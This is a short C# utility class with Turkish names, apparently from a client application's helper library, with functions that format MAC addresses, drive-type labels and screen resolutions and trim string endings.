using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;

namespace xClient.KuuhakuÇekirdek.Yardımcılar
{
    public static class FormatYardımcısı
    {
        public static string FormatMacAddress(string macAddress)
        {
            return (macAddress.Length != 12)
                ? "00:00:00:00:00:00"
                : Regex.Replace(macAddress, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6");
        }

        public static string DriveTypeName(DriveType type)
        {
            switch (type)
            {
                case DriveType.Fixed:
                    return "Yerel Disk";
                case DriveType.Network:
                    return "Ağ Sürücüsü";
                case DriveType.Removable:
                    return "Kaldırılabilir Sürücü";
                default:
                    return type.ToString();
            }
        }

        public static string FormatScreenResolution(Rectangle resolution)
        {
            return string.Format("{0}x{1}", resolution.Width, resolution.Height);
        }

        public static string RemoveEnd(string input)
        {
            if (input.Length > 2)
                input = input.Remove(input.Length - 2);
            return input;
        }
    }
}